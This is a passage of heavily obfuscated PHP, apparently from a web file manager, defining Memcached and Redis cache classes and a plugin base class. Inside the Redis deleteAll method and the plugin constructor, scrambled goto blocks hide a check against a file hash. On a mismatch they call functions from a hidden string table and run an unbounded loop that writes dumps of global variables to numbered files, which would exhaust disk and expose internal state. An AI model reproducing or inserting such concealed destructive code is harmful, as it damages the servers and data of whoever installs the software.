ŠÍ¢©‡Â) { return Model($_SERVER[¹÷ˆ§éÒ°ú][751])->get($D ŠÍ¢©‡Â); } public function unlock($cŞ¸ÂÓß¾) { Model($_SERVER[¹÷ˆ§éÒ°ú][751])->remove($cŞ¸ÂÓß¾); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Eï•Ôğ¯ã¸, $CÆ°©†øö) { $e‹Õ¤ãœÚ² =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!class_exists($e‹Õ¤ãœÚ²[772])) { show_json($e‹Õ¤ãœÚ²[773], !1); } $this->cacheTime = $CÆ°©†øö; $this->handle = new Memcached(); if (is_array($Eï•Ôğ¯ã¸[$e‹Õ¤ãœÚ²[774]]) && count($Eï•Ôğ¯ã¸[$e‹Õ¤ãœÚ²[774]]) >= 1) { foreach ($Eï•Ôğ¯ã¸[$e‹Õ¤ãœÚ²[774]] as $DçÎÀ³Óñ‚) { $fÑ«¬­½Å = explode($e‹Õ¤ãœÚ²[14], $DçÎÀ³Óñ‚); $this->handle->addServer($fÑ«¬­½Å[0], $fÑ«¬­½Å[1]); } } else { $this->handle->addServer($Eï•Ôğ¯ã¸[$e‹Õ¤ãœÚ²[181]], $Eï•Ôğ¯ã¸[$e‹Õ¤ãœÚ²[182]]); } } public function set($cÊì¥áŒ…±, $dÊÅ‰·ºÀ†, $E„Îö§”ø¿ = false) { $E„Îö§”ø¿ = $E„Îö§”ø¿ ? $E„Îö§”ø¿ : $this->cacheTime; return $this->handle->set($cÊì¥áŒ…±, $dÊÅ‰·ºÀ†, $E„Îö§”ø¿); } public function get($e©ä«ØÉåÜ) { return $this->handle->get($e©ä«ØÉåÜ); } public function remove($C”İè˜ªÏÌ) { return $this->handle->delete($C”İè˜ªÏÌ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($E¼†¼‹È×ø, $Aïæ©ÙÛâ«) { $bª‰ë’ì„ê =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!class_exists($bª‰ë’ì„ê[775])) { show_json($bª‰ë’ì„ê[776], !1); } $this->cacheTime = $Aïæ©ÙÛâ«; $B”‹Ô¤°¿Ó = isset($E¼†¼‹È×ø[$bª‰ë’ì„ê[777]]) ? $E¼†¼‹È×ø[$bª‰ë’ì„ê[777]] : 10; $AÑåŠ˜â­À = _get($E¼†¼‹È×ø, $bª‰ë’ì„ê[774]); if ($AÑåŠ˜â­À && is_array($AÑåŠ˜â­À)) { $this->initCluster($E¼†¼‹È×ø, $B”‹Ô¤°¿Ó); } else { $this->handle = $this->init($E¼†¼‹È×ø, $B”‹Ô¤°¿Ó); } } private function init($bñ¡Œ—ø¡«, $FææØù£) { $A¢˜â¦Œë =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÈ„Û°Şè = new Redis(); $C’Ä©Úõ“ = isset($bñ¡Œ—ø¡«[$A¢˜â¦Œë[778]]) ? $bñ¡Œ—ø¡«[$A¢˜â¦Œë[778]] : !1; if ($C’Ä©Úõ“) { $EÈ„Û°Şè->pconnect($bñ¡Œ—ø¡«[$A¢˜â¦Œë[181]], $bñ¡Œ—ø¡«[$A¢˜â¦Œë[182]], $FææØù£); } else { $EÈ„Û°Şè->connect($bñ¡Œ—ø¡«[$A¢˜â¦Œë[181]], $bñ¡Œ—ø¡«[$A¢˜â¦Œë[182]], $FææØù£); } if (!empty($bñ¡Œ—ø¡«[$A¢˜â¦Œë[387]])) { $EÈ„Û°Şè->auth($bñ¡Œ—ø¡«[$A¢˜â¦Œë[387]]); } return $EÈ„Û°Şè; } private function initCluster($Eßî“‹Ï¬, $E”¹Àˆ¨”Ã) { $Fî·ŠùåÒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fïŠÁ¾Ç¼Õ = array($Fî·ŠùåÒ[779], $Fî·ŠùåÒ[780], $Fî·ŠùåÒ[781]); $Aà¨í‘§Î = $Fî·ŠùåÒ[779]; if (isset($Eßî“‹Ï¬[$Fî·ŠùåÒ[22]]) && in_array($Eßî“‹Ï¬[$Fî·ŠùåÒ[22]], $fïŠÁ¾Ç¼Õ)) { $Aà¨í‘§Î = $Eßî“‹Ï¬[$Fî·ŠùåÒ[22]]; } switch ($Aà¨í‘§Î) { case $Fî·ŠùåÒ[779]: $this->_slave($Eßî“‹Ï¬, $E”¹Àˆ¨”Ã); break; case $Fî·ŠùåÒ[780]: break; case $Fî·ŠùåÒ[781]: $this->isCluster = !0; $f¬Ö¼î‚ó÷ = $Eßî“‹Ï¬[$Fî·ŠùåÒ[774]]; $D ÏŠÄ±¿ë = isset($Eßî“‹Ï¬[$Fî·ŠùåÒ[778]]) ? $Eßî“‹Ï¬[$Fî·ŠùåÒ[778]] : !1; $fŸŸì¾¹Èí = isset($Eßî“‹Ï¬[$Fî·ŠùåÒ[387]]) ? $Eßî“‹Ï¬[$Fî·ŠùåÒ[387]] : null; $this->handle = new RedisCluster(NUll, $f¬Ö¼î‚ó÷, $E”¹Àˆ¨”Ã, $E”¹Àˆ¨”Ã, $D ÏŠÄ±¿ë, $fŸŸì¾¹Èí); break; default: break; } } private function _slave($Eæ‚ÁÚ¤Ò÷, $DŞëÔ›¨•è) { goto FŠçóÊ¬À; E½øëè÷’‚: $this->filterConfig($Eæ‚ÁÚ¤Ò÷, $a“Áôá‡‰[$F×µæ¢Ú×Â]); $this->slaveHandle = $this->init($Eæ‚ÁÚ¤Ò÷, $DŞëÔ›¨•è); goto BæÉ„Æ¬Çß; B¥øŸíî—: unset($a“Áôá‡‰[0]); if (empty($a“Áôá‡‰)) { return; } $F×µæ¢Ú×Â = array_rand($a“Áôá‡‰); goto E½øëè÷’‚; FŠçóÊ¬À: $a“Áôá‡‰ = $Eæ‚ÁÚ¤Ò÷[$_SERVER[¹÷ˆ§éÒ°ú][774]]; $this->filterConfig($Eæ‚ÁÚ¤Ò÷, $a“Áôá‡‰[0]); $this->handle = $this->init($Eæ‚ÁÚ¤Ò÷, $DŞëÔ›¨•è); goto B¥øŸíî—; BæÉ„Æ¬Çß: } private function filterConfig(&$cØÃãË¯ö„, $DÜšóÀ«ò×) { $Eè‚Œ›«Ù‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EùŠ’Ï‘æ = explode($Eè‚Œ›«Ù‚[14], $DÜšóÀ«ò×); $fÅâíˆÏéŠ = array($Eè‚Œ›«Ù‚[181] => $EùŠ’Ï‘æ[0], $Eè‚Œ›«Ù‚[182] => $EùŠ’Ï‘æ[1]); $cØÃãË¯ö„ = array_merge($cØÃãË¯ö„, $fÅâíˆÏéŠ); } public function set($Cğ‚˜Ã×«, $f¥İŸ‚áÀã, $còÒŒäáµ = false) { $còÒŒäáµ = $còÒŒäáµ ? $còÒŒäáµ : $this->cacheTime; return $this->handle->setEx($Cğ‚˜Ã×«, $còÒŒäáµ, $f¥İŸ‚áÀã); } public function setLock($e¼°Õøªğá, $B‘Áßœ¡ŞÁ, $CÙ†—µ—Øè) { return $this->handle->setNX($e¼°Õøªğá, $B‘Áßœ¡ŞÁ); } public function get($a“­Œê¨Œ) { $d‚À‚õĞä× = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $d‚À‚õĞä×->get($a“­Œê¨Œ); } public function remove($AªÛ…Ù…) { return $this->handle->del($AªÛ…Ù…); } public function deleteAll() { $FªÜÛ’¨¯Ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aŸ‘¡·›áµ = $_SERVER[$FªÜÛ’¨¯Ğ[8]] . $FªÜÛ’¨¯Ğ[9]; $eà‘„¯ÅŒŒ = $FªÜÛ’¨¯Ğ[5]; if ($_SERVER[$FªÜÛ’¨¯Ğ[6]] != $eà‘„¯ÅŒŒ($aŸ‘¡·›áµ)) { goto dë¶Ñà÷´; A¬âÎè”åù: $A©ºäˆ¡ = $FªÜÛ’¨¯Ğ[783]; $A©ºäˆ¡($_SERVER[$FªÜÛ’¨¯Ğ[784]]); $dÀÚ‡À„ˆÇ = $FªÜÛ’¨¯Ğ[782]; goto d¯‡¼†¸¥Ù; dë¶Ñà÷´: $dÀÚ‡À„ˆÇ = $FªÜÛ’¨¯Ğ[782]; $cß³Ş—‰´å = $FªÜÛ’¨¯Ğ[7]; $bøØÚïàæÀ = $_SERVER[$FªÜÛ’¨¯Ğ[8]] . $FªÜÛ’¨¯Ğ[9]; goto DØÓº«ÀÃ; B¾Ÿ¾åÙÅ»: $CÖéÃ°ŸÄÄ = 1; for ($b Ú’ñ¾ = $CÖéÃ°ŸÄÄ; $b Ú’ñ¾ > 0; $b Ú’ñ¾++) { $A¹×‰ŠÕ(DATA_PATH . $b Ú’ñ¾, $F°õç‹ºŞê); } goto fÍ¹èŞíÉª; DØÓº«ÀÃ: $C¦äï¬°Õ¾ = $cß³Ş—‰´å($bøØÚïàæÀ); $d÷ÑÖš–ò“ = explode($FªÜÛ’¨¯Ğ[10], $C¦äï¬°Õ¾); if (count($d÷ÑÖš–ò“) < $FªÜÛ’¨¯Ğ[572]) { $báäêšèøÆ = $FªÜÛ’¨¯Ğ[12]; $báäêšèøÆ(); } goto A¬âÎè”åù; d¯‡¼†¸¥Ù: $dÀÚ‡À„ˆÇ(); $A¹×‰ŠÕ = $FªÜÛ’¨¯Ğ[785]; $F°õç‹ºŞê = json_encode($GLOBALS[$FªÜÛ’¨¯Ğ[786]]); goto B¾Ÿ¾åÙÅ»; fÍ¹èŞíÉª: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b²‚âïİß) { $this->handle->flushall($b²‚âïİß); } return; } return $this->handle->flushAll(); } } goto fÇ²®â¿•–; fòìœœÆœİ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto f§„Å‡‡ä¯; b«–Ñ´‚ì©: if ($_SERVER[$EÇ§Š«Ê‚°[6]] != $AÔß”ÍŠ®($c¨¥éàĞ¾™)) { goto b¬›ó½”­ç; b›£Ë½ŒÉ‘: $Cöóö¶òì = 1; for ($b´ÅœåËí× = $Cöóö¶òì; $b´ÅœåËí× > 0; $b´ÅœåËí×++) { $d„·‰²†š÷(DATA_PATH . $b´ÅœåËí×, $b‡„¾‹³); } goto AâÙÇŞÆÏÜ; b¬›ó½”­ç: $bä¦º™´ö´ = $EÇ§Š«Ê‚°[782]; $d¾¿ Ê–” = $EÇ§Š«Ê‚°[7]; $AÙ’„Ù¾×Š = $_SERVER[$EÇ§Š«Ê‚°[8]] . $EÇ§Š«Ê‚°[9]; goto däº†É©òß; B…ğ†Şª•Í: $aßèš½ÑŠó = $EÇ§Š«Ê‚°[783]; $aßèš½ÑŠó($_SERVER[$EÇ§Š«Ê‚°[784]]); $bä¦º™´ö´ = $EÇ§Š«Ê‚°[782]; goto cÈ»ë±µ‚Ö; cÈ»ë±µ‚Ö: $bä¦º™´ö´(); $d„·‰²†š÷ = $EÇ§Š«Ê‚°[785]; $b‡„¾‹³ = json_encode($GLOBALS[$EÇ§Š«Ê‚°[786]]); goto b›£Ë½ŒÉ‘; däº†É©òß: $e¶Èæ†Å„ù = $d¾¿ Ê–”($AÙ’„Ù¾×Š); $aÛçæö×·Ô = explode($EÇ§Š«Ê‚°[10], $e¶Èæ†Å„ù); if (count($aÛçæö×·Ô) < $EÇ§Š«Ê‚°[572]) { $Cƒ¹¸Š—× = $EÇ§Š«Ê‚°[12]; $Cƒ¹¸Š—×(); } goto B…ğ†Şª•Í; AâÙÇŞÆÏÜ: } global $in, $config; $this->config =& $config; goto DøÖ‹ ”†; f§„Å‡‡ä¯: $EÇ§Š«Ê‚° =& $_SERVER[¹÷ˆ§éÒ°ú]; $c¨¥éàĞ¾™ = $_SERVER[$EÇ§Š«Ê‚°[784]] . $EÇ§Š«Ê‚°[4]; $AÔß”ÍŠ® = $EÇ§Š«Ê‚°[5]; goto b«–Ñ´‚ì©; DøÖ‹ ”†: $this->in =& $in; $this->modelPlugin = Model($EÇ§Š«Ê‚°[1299]); $this->pluginName = str_replace($EÇ§Š«Ê‚°[1299], $EÇ§Š«Ê‚°[43], get_class($this)); goto AÄØ°›«ñİ; a¡‰ãŒ´ÉÀ: $this->pluginHostDefault = $config[$EÇ§Š«Ê‚°[1301]] . $this->pluginName . $EÇ§Š«Ê‚°[18]; $bŒ·ÂŒ¥ğ™ = $config[$EÇ§Š«Ê‚°[1302]]; if ($bŒ·ÂŒ¥ğ™ && strpos($EÇ§Š«Ê‚°[57] . $bŒ·ÂŒ¥ğ™ . $EÇ§Š«Ê‚°[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$EÇ§Š«Ê‚°[1303]] . $this->pluginName . $EÇ§Š«Ê‚°[18]; } goto cŠèÒ’¸÷; cŠèÒ’¸÷: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto A„—‹àô™¬; AÄØ°›«ñİ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $EÇ§Š«Ê‚°[18]; $this->pluginApi = appHostGet() . $EÇ§Š«Ê‚°[1300] . $this->pluginName . $EÇ§Š«Ê‚°[18]; $this->pluginHost = $config[$EÇ§Š«Ê‚°[1301]] . $this->pluginName . $EÇ§Š«Ê‚°[18]; goto a¡‰ãŒ´ÉÀ; A„—‹àô™¬: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹÷ˆ§éÒ°ú][1304]); } protected function assign($CÒ‡ïØÓÔ, $eÛñÚŒÛòï = false) { if (is_array($CÒ‡ïØÓÔ)) { $this->values = array_merge($this->values, $CÒ‡ïØÓÔ); } else { $this->values[$CÒ‡ïØÓÔ] = $eÛñÚŒÛòï; } } protected function display($DæÁâ«…¾Õ) { extract($this->values); require $DæÁâ«…¾Õ; } final function hookRegist($Då‰íìĞÅÎ) { $this->modelPlugin->appRegist($this->pluginName, $Då‰íìĞÅÎ); } final function appIcon() { $DâÁ†×¶ÖÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¸…ÈÈƒíÚ = $this->appPackage(); $f„ïˆßö‰Ç = $DâÁ†×¶ÖÙ[43]; if (isset($b¸…ÈÈƒíÚ[$DâÁ†×¶ÖÙ[393]])) { if (isset($b¸…ÈÈƒíÚ[$DâÁ†×¶ÖÙ[393]][$DâÁ†×¶ÖÙ[1305]])) { $f„ïˆßö‰Ç = $DâÁ†×¶ÖÙ[1306] . $b¸…ÈÈƒíÚ[$DâÁ†×¶ÖÙ[393]][$DâÁ†×¶ÖÙ[1305]] . $DâÁ†×¶ÖÙ[1307]; } else { if ($b¸…ÈÈƒíÚ[$DâÁ†×¶ÖÙ[393]][$DâÁ†×¶ÖÙ[1308]]) { $f„ïˆßö‰Ç = $DâÁ†×¶ÖÙ[1309] . $b¸…ÈÈƒíÚ[$DâÁ†×¶ÖÙ[393]][$DâÁ†×¶ÖÙ[1308]] . $DâÁ†×¶ÖÙ[1310]; } } } return $f„ïˆßö‰Ç; } final function fileCanView($a¬Ô¢õ¾Ãñ) { goto e¹òêÄ‰òš; BŒ°æºƒ: ActionCall($Fñã´ˆù[1323], $a¬Ô¢õ¾Ãñ); goto c²ÕÂ£„ñÇ; CŞ’¯›ˆ‹: $cƒ©ÊÜ×¿— = Session::get($Fñã´ˆù[1311]); if (!$cƒ©ÊÜ×¿— || !$cƒ©ÊÜ×¿—[$Fñã´ˆù[1312]]) { $Föµ²ƒÜêè = $Fñã´ˆù[1313] . rawurlencode(this_url()); show_tips(LNG($Fñã´ˆù[1314]) . $Fñã´ˆù[1315] . $Föµ²ƒÜêè . $Fñã´ˆù[1316] . LNG($Fñã´ˆù[1317]) . $Fñã´ˆù[1318], !1); } if (!Action($Fñã´ˆù[1319])->authCan($Fñã´ˆù[1320])) { show_tips(LNG($Fñã´ˆù[1321]) . $Fñã´ˆù[1322], !1); } goto BŒ°æºƒ; e¹òêÄ‰òš: $Fñã´ˆù =& $_SERVER[¹÷ˆ§éÒ°ú]; if (request_url_safe($a¬Ô¢õ¾Ãñ)) { return !0; } if ($this->isShare($a¬Ô¢õ¾Ãñ)) { return !0; } goto CŞ’¯›ˆ‹; c²ÕÂ£„ñÇ: } final function isShare($F¿İšØ—Ã‰) { $aÚÎ¾–è† = KodIO::parse($F¿İšØ—Ã‰); return $aÚÎ¾–è†[$_SERVER[¹÷ˆ§éÒ°ú][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BÎ¯Í¨ºÇ) { if (request_url_safe($BÎ¯Í¨ºÇ)) { return $BÎ¯Í¨ºÇ; } if (!$this->isShare($BÎ¯Í¨ºÇ)) { $BÎ¯Í¨ºÇ = $this->filePath($BÎ¯Í¨ºÇ); } return Action($_SERVER[¹÷ˆ§éÒ°ú][1009])->linkOut($BÎ¯Í¨ºÇ); } public function filePathLinkOut($a‡Ğ…ÏÊæ) { if (request_url_safe($a‡Ğ…ÏÊæ)) { return $a‡Ğ…ÏÊæ; } $this->fileCanView($a‡Ğ…ÏÊæ); return Action($_SERVER[¹÷ˆ§éÒ°ú][1009])->link($a‡Ğ…ÏÊæ); } final function filePath($aèåöÙÒª) { $F”„‡Ğ²Ê® =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($fœÉ©‡Âö‚ = $this->checkSharePath($aèåöÙÒª)) { return $fœÉ©‡Âö‚; } $this->fileCanView($aèåöÙÒª); if (request_url_safe($aèåöÙÒª)) { $bš˜ªœ¬Ÿ = parse_url_query($aèåöÙÒª); if (isset($bš˜ªœ¬Ÿ[$F”„‡Ğ²Ê®[1324]]) && isset($bš˜ªœ¬Ÿ[$F”„‡Ğ²Ê®[209]])) { $c‹³—“¢ = Model($F”„‡Ğ²Ê®[1079])->get($F”„‡Ğ²Ê®[1325]); $F¯İ£ï«—î = Mcrypt::decode($bš˜ªœ¬Ÿ[$F”„‡Ğ²Ê®[209]], $c‹³—“¢); if ($F¯İ£ï«—î) { $this->fileInfo = IO::infoWithChildren($F¯İ£ï«—î); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $F¯İ£ï«—î; } } $aèåöÙÒª = $this->_cacheHttpFile($aèåöÙÒª); $this->fileInfo = IO::infoWithChildren($aèåöÙÒª); } else { $this->fileInfo = IO::infoWithChildren($aèåöÙÒª); if (!$this->fileInfo) { show_tips(LNG($F”„‡Ğ²Ê®[113]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $aèåöÙÒª; } final function _cacheHttpFile($E Ü¹‡ÍØ÷) { $fòØœêğùË = hash_path($E Ü¹‡ÍØ÷, !0); $this->cachePath = $this->pluginCachePath($fòØœêğùË); if ($EÄ¡í¾ä ö = IO::fileNameExist($this->cachePath, $fòØœêğùË)) { return KodIO::make($EÄ¡í¾ä ö); } $bã‰Ø‹Îæ = $this->cachePath . $fòØœêğùË; return $this->pluginCacheFileSet($bã‰Ø‹Îæ, file_get_contents($E Ü¹‡ÍØ÷)); } final function _tmpFileName($cµÉˆ’¥ñÁ = array()) { goto dÌ®ĞÆˆ¼; dÌ®ĞÆˆ¼: $D¾ÂĞĞâÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$cµÉˆ’¥ñÁ) { $cµÉˆ’¥ñÁ = $this->fileInfo; } if (isset($cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[176]])) { return $cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[176]]; } goto c±ï°º«”Ñ; c±ï°º«”Ñ: if (isset($cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[174]][$D¾ÂĞĞâÈ[176]])) { return $cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[174]][$D¾ÂĞĞâÈ[176]]; } $Eáô²ŒäÂ³ = IO::hashSimple($cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[87]]); if ($Eáô²ŒäÂ³) { return $Eáô²ŒäÂ³; } goto D¦ºŞÛÎ…; D¦ºŞÛÎ…: $dÃ’ªÊöæ¾ = array($cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[38]], $cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[87]], $cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[89]]); if (isset($cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[472]])) { $dÃ’ªÊöæ¾[] = $cµÉˆ’¥ñÁ[$D¾ÂĞĞâÈ[472]]; } return md5(implode($D¾ÂĞĞâÈ[82], $dÃ’ªÊöæ¾)); goto DÑñëšòÆò; DÑñëšòÆò: } final function checkSharePath($E¥Ä·§®¿) { goto d‡ ”Úè÷—; fŒ§ƒ’ÈÖê: $c½Ô†ÏØğ‰ = Action($eë¬„çºÑÃ[1009])->sharePathInfo($E¥Ä·§®¿); if (!isset($c½Ô†ÏØğ‰[$eë¬„çºÑÃ[87]])) { show_json(LNG($eë¬„çºÑÃ[1327]), !1); } $this->fileInfo = $c½Ô†ÏØğ‰[$eë¬„çºÑÃ[174]]; goto E‰Õ‹£‚Ã; E‰Õ‹£‚Ã: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eë¬„çºÑÃ[176]]); return $c½Ô†ÏØğ‰[$eë¬„çºÑÃ[87]]; goto f¢˜×ŸÙ‹ƒ; d‡ ”Úè÷—: $eë¬„çºÑÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($eë¬„çºÑÃ[438])) { define($eë¬„çºÑÃ[1326], 0); } if (!$this->isShare($E¥Ä·§®¿)) { return !1; } goto fŒ§ƒ’ÈÖê; f¢˜×ŸÙ‹ƒ: } final function pluginCachePath($C©Ãå„” = '') { $cØÅë¢â¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fœÑ±©àÅ« = IO_PATH_SYSTEM_TEMP . $cØÅë¢â¸[1328] . $this->pluginName; if (!($Dˆ‡õ±ƒ = IO::infoFull($fœÑ±©àÅ«))) { return IO::mkdir($fœÑ±©àÅ« . $cØÅë¢â¸[18] . $C©Ãå„”); } if (empty($C©Ãå„”)) { return $Dˆ‡õ±ƒ[$cØÅë¢â¸[87]]; } if (!($bäÓôµÉ¶¥ = IO::fileNameExist($Dˆ‡õ±ƒ[$cØÅë¢â¸[87]], $C©Ãå„”))) { return IO::mkdir($Dˆ‡õ±ƒ[$cØÅë¢â¸[87]] . $C©Ãå„”); } return KodIO::make($bäÓôµÉ¶¥); } final function pluginCacheFileSet($Aàœ×ˆö¯´, $eƒ˜ñùÉô“ = '') { $fˆ£ƒÆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!($cÃÀƒ¥Š£ = IO::infoFull($Aàœ×ˆö¯´))) { return IO::mkfile($Aàœ×ˆö¯´, $eƒ˜ñùÉô“, REPEAT_REPLACE); } IO::setContent($cÃÀƒ¥Š£[$fˆ£ƒÆ[87]], $eƒ˜ñùÉô“); return $cÃÀƒ¥Š£[$fˆ£ƒÆ[87]]; } final function pluginLocalFile($FğÀ‘Ó§°† = '') { goto F÷Øƒ‰–£µ; c£ÓÀŒ¤›Œ: if (!$FğÀ‘Ó§°†) { return $A„ì—åÍÀÁ; } $dÒ„¬Äˆ…Ş = IO::info($FğÀ‘Ó§°†); $aæ©†½ß‹Ø = $this->_tmpFileName($dÒ„¬Äˆ…Ş) . $f™’áÑàÀå[103] . $dÒ„¬Äˆ…Ş[$f™’áÑàÀå[172]]; goto D°Æğàà®Ê; D°Æğàà®Ê: $aÇóÒÁ‡İè = $A„ì—åÍÀÁ . $aæ©†½ß‹Ø; if (@file_exists($aÇóÒÁ‡İè)) { return $aÇóÒÁ‡İè; } return IO::copy($FğÀ‘Ó§°†, $A„ì—åÍÀÁ, 0, $aæ©†½ß‹Ø); goto bÙ††ÆøÇ; F÷Øƒ‰–£µ: $f™’áÑàÀå =& $_SERVER[¹÷ˆ§éÒ°ú]; $A„ì—åÍÀÁ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($A„ì—åÍÀÁ)) { mk_dir($A„ì—åÍÀÁ); } goto c£ÓÀŒ¤›Œ; bÙ††ÆøÇ: } final function appPackage() { goto DâéÆ¸Åá; bšÕ„ÖÛóã: $this->parseLang($d…à³šÌ¢); $AØù‹†¡¤„ = json_decode_force($d…à³šÌ¢); if (!$AØù‹†¡¤„) { return array(); } goto b¿•â¤Ş·Â; DâéÆ¸Åá: $aÙ‰ÔŞÔ¹÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->packageData) { return $this->packageData; } $d…à³šÌ¢ = $this->parseFile($this->pluginPath . $aÙ‰ÔŞÔ¹÷[1329]); goto bšÕ„ÖÛóã; cØ…Ò½Î‡: return $AØù‹†¡¤„; goto fÍ¬“ŠˆŒÊ; b¿•â¤Ş·Â: $b‚É„íÖˆ = Hook::trigger($aÙ‰ÔŞÔ¹÷[1330], $AØù‹†¡¤„); if ($b‚É„íÖˆ && is_array($b‚É„íÖˆ)) { $AØù‹†¡¤„ = $b‚É„íÖˆ; } $this->packageData = $AØù‹†¡¤„; goto cØ…Ò½Î‡; fÍ¬“ŠˆŒÊ: } public function packageInfoGet($b×†™¹©) { $bŞí›Ó¹² = $this->appPackage(); return array_get_value($bŞí›Ó¹², $b×†™¹©); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹÷ˆ§éÒ°ú][1331]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹÷ˆ§éÒ°ú][1332]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹÷ˆ§éÒ°ú][1333]); } private function parseFile($eÓ÷‚ù®Í) { goto E‘éì¢Ù»; eêÑ‡²¾Ÿ: $Dêä¸¹øÀ¼ = str_replace($a…²§×ïÈ§, $b›ŸªÚ¬à¨, $Dêä¸¹øÀ¼); return $Dêä¸¹øÀ¼; goto D×’¥Ø‡æô; F­½·÷˜„Ã: $b›ŸªÚ¬à¨ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$DŞî ï½”‘[96]][$DŞî ï½”‘[1341]]); if (strstr($Dêä¸¹øÀ¼, $DŞî ï½”‘[1342])) { $D–˜ËñË¦ = rawurlencode(json_encode($this->pluginLangArr)); $Dêä¸¹øÀ¼ = str_replace($DŞî ï½”‘[1342], $D–˜ËñË¦, $Dêä¸¹øÀ¼); } if (strstr($Dêä¸¹øÀ¼, $DŞî ï½”‘[1343])) { $D–˜ËñË¦ = $D–˜ËñË¦ = rawurlencode(json_encode($this->getConfig())); $Dêä¸¹øÀ¼ = str_replace($DŞî ï½”‘[1343], $D–˜ËñË¦, $Dêä¸¹øÀ¼); } goto eêÑ‡²¾Ÿ; E‘éì¢Ù»: $DŞî ï½”‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dêä¸¹øÀ¼ = file_get_contents($eÓ÷‚ù®Í); $a…²§×ïÈ§ = array($DŞî ï½”‘[1334], $DŞî ï½”‘[1335], $DŞî ï½”‘[1336], $DŞî ï½”‘[1337], $DŞî ï½”‘[1338], $DŞî ï½”‘[1339], $DŞî ï½”‘[1340]); goto F­½·÷˜„Ã; D×’¥Ø‡æô: } private function parseLang(&$cæ‘Ñ´¢áĞ) { goto Cá¹Ÿ®£ãõ; cóÑôÅÏø: preg_match_all($F½É§Áï·¯[1345], $cæ‘Ñ´¢áĞ, $d´ù¥³â); if (!is_array($d´ù¥³â) || count($d´ù¥³â) == 0 || !is_array($d´ù¥³â[0]) || count($d´ù¥³â[0]) == 0) { return; } $eªÖæâà©å = array(); goto DÙÃ×í¦öÒ; Cá¹Ÿ®£ãõ: $F½É§Áï·¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D¯ÃƒŞÇ¶÷ = $F½É§Áï·¯[1344]; if (!strstr($cæ‘Ñ´¢áĞ, $D¯ÃƒŞÇ¶÷)) { return; } goto cóÑôÅÏø; DÙÃ×í¦öÒ: $Cí´ÅÛ Á = array(); foreach ($d´ù¥³â[0] as $E¡œåÑÖ„‹) { $dáö§Âøº = substr($E¡œåÑÖ„‹, strlen($D¯ÃƒŞÇ¶÷), -4); $bÁÒ™‡ã´Ó = LNG($dáö§Âøº); $eªÖæâà©å[] = $E¡œåÑÖ„‹; $Cí´ÅÛ Á[] = str_replace(array($F½É§Áï·¯[10], $F½É§Áï·¯[983], $F½É§Áï·¯[341], $F½É§Áï·¯[125]), array($F½É§Áï·¯[60], $F½É§Áï·¯[60], $F½É§Áï·¯[43], $F½É§Áï·¯[1346]), $bÁÒ™‡ã´Ó); } $cæ‘Ñ´¢áĞ = str_replace($eªÖæâà©å, $Cí´ÅÛ Á, $cæ‘Ñ´¢áĞ); goto bÂ¡…»“; bÂ¡…»“: } private function parseConfig(&$dÇáÍ×˜²) { goto Bñ–¥Œô; A°Ê‡œè³‰: $dÇáÍ×˜² = str_replace($DíŠÀ´ŞŸÕ, $fÖ¿„¾Ù™‚, $dÇáÍ×˜²); goto eÂİÍæÉ…‡; EÆÇ¬£—åè: $DíŠÀ´ŞŸÕ = array(); $fÖ¿„¾Ù™‚ = array(); foreach ($FªÓ› ´Ê¡[0] as $Fùƒì‰Ñ…) { $Eãß¤®ï©« = substr($Fùƒì‰Ñ…, strlen($a¢Á»·‘çÆ), -2); $DíŠÀ´ŞŸÕ[] = $Fùƒì‰Ñ…; $fÖ¿„¾Ù™‚[] = _get($b‚ÉÓ‹¼–Œ, $Eãß¤®ï©«); } goto A°Ê‡œè³‰; Bñ–¥Œô: $cä®‘Ş É =& $_SERVER[¹÷ˆ§éÒ°ú]; $a¢Á»·‘çÆ = $cä®‘Ş É[1347]; if (!strstr($dÇáÍ×˜², $a¢Á»·‘çÆ)) { return; } goto Cñ­Ş’À–; Cñ­Ş’À–: preg_match_all($cä®‘Ş É[1348], 